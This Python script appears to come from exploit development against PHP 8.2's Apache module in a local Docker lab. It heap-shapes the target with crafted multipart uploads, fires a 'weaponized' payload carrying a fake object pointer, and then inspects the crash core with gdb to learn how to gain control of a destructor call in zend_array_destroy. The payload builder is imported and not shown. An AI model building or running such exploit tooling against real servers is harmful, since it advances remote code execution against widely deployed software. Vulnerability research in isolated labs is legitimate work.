#!/usr/bin/env python3
"""oom122: CORE-ENABLED crash replica -> identify the walk's window memory.

New law from disassembly (tonight): zend_array_destroy+539 is
`subl $0x1,(%rdi)` after `cmpb $0x0,0x9(%rbx)` (+530) and
`mov (%rbx),%rdi` (+536); rc==0 -> `call rc_dtor_func` (+544) with
rdi = window value. Names (NUL-free) can only produce non-canonical
rdi -> write-fault, never dispatch. Dispatch carrier MUST contain
NULs. Which carrier the walk reads (names? buckets? values?) is the
open question -> crash with cores enabled, dump rbx±64.

Plan: recreate(core=-1) -> shape(98-era) -> P1 weaponized fire
(names stamps 0x41..., values 'v') -> conn-kill + segv -> pull core
(two-hop) -> gdb: rdi, rbx (need regs; bt), dump x/32gx $rbx-128 and
x/32gx $rdi-64 -> print. Identify pattern by eye (0x41/0x7a stamps,
NUL-rich buckets, 02-tiles).
"""
import re, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8081"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"


def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(65536).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__


def sh(cmd, timeout=60):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()


def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))


def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8081:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False


def post_mod(body, timeout=240):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__


print("=== oom122: core-enabled P1 replica -> window memory identify ===", flush=True)
assert recreate(), "recreate failed"
md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
print("md5=%s corelim=%s" % (md5[:8], sh("cat /proc/1/limits | grep -i core").split()[3]), flush=True)
assert md5 == STOCK_MD5

for k1 in P.K1S[:-1]:
    post_mod(P.build_attack(k1, 5000000))
print("shaped; segv so far=%d" % segv_count(), flush=True)

# weaponized fire (98-series exact)
code, resp = post_mod(P.build_attack(3400, 5300000, target_obj=0x414141414141))
time.sleep(3)
core = sh("test -f /tmp/core && echo y") == "y"
print("fire: %s core=%s segv_total=%d" % (code, core, segv_count()), flush=True)
assert core, "no core despite crash - ulimit law failed"

c1 = subprocess.run(["docker", "cp", "php_vuln:/tmp/core", "/tmp/core122"], capture_output=True)
assert c1.returncode == 0, "core pull failed"
subprocess.run(["docker", "cp", "/tmp/core122", "phpbuild:/tmp/core.122"], capture_output=True)

open("/tmp/g122.gdb", "w").write(
    "set pagination off\nset confirm off\n"
    "info registers rdi rbx rip\n"
    "echo ===WINDOW rbx-128..rbx+128===\n"
    "x/32gx $rbx-128\n"
    "echo ===RDIREG rdi-64..rdi+64===\n"
    "x/16gx $rdi-64\n"
    "quit\n")
r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                    "gdb -q -batch -x /tmp/g122.gdb /tmp/libphp.stock.so /tmp/core.122 2>&1"],
                   capture_output=True, timeout=240)
out = r.stdout.decode("latin1")
print(out[-4000:], flush=True)
print("=== done ===", flush=True)
